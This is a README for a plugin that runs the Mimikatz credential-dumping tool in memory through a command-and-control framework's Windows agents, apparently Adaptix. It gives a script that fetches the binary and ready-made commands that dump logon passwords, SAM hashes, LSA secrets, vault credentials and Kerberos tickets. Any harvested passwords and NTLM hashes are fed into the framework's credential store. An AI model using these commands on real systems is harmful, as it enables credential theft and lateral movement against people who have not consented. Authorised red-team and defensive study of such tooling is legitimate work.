# Mimikatz

In-memory execution of the official [Mimikatz](https://github.com/gentilkiwi/mimikatz) PE via [No-Consolation](https://github.com/fortra/No-Consolation). This exposes the full Mimikatz module set (`sekurlsa`, `lsadump`, `kerberos`, `vault`, `dpapi`, `token`, `privilege`, `crypto`, `process`, `service`, `ts`, `rpc`, ...) instead of the smaller Creds-BOF dumps.

The PE is **not** stored in git. Fetch it on the teamserver, then reload axscripts.

```bash
bash Extension-Kit/Creds-BOF/mimikatz/fetch_mimikatz.sh
```

Requires `Execution-BOF` to be built (`NoConsolation.x64.o`).

## Usage

Windows `beacon` / `gopher` / `kharon` agents. High-integrity is required for most credential modules.

```
mimikatz
mimikatz privilege::debug sekurlsa::logonpasswords exit
mimikatz privilege::debug token::elevate lsadump::sam exit
mimikatz privilege::debug sekurlsa::tickets /export exit
mimikatz privilege::debug sekurlsa::ekeys exit
mimikatz privilege::debug vault::cred vault::list exit
mimikatz coffee
```

Flags:

```
mimikatz [--timeout 120] [-f /path/to/mimikatz.exe] [--no-exit] [--dont-save] [-k] [modules...]
```

No module list defaults to `privilege::debug sekurlsa::logonpasswords` and appends `exit` so the inline PE returns.

Discovered plaintext passwords and NTLM hashes are added to the Adaptix credentials store. Access-menu shortcuts cover logonpasswords, tickets, ekeys, SAM, LSA secrets, cache, vault, and coffee.

## License

Mimikatz is [CC BY 4.0](https://github.com/gentilkiwi/mimikatz) (Benjamin Delpy). This wrapper only launches the official build; it does not reimplement the modules.
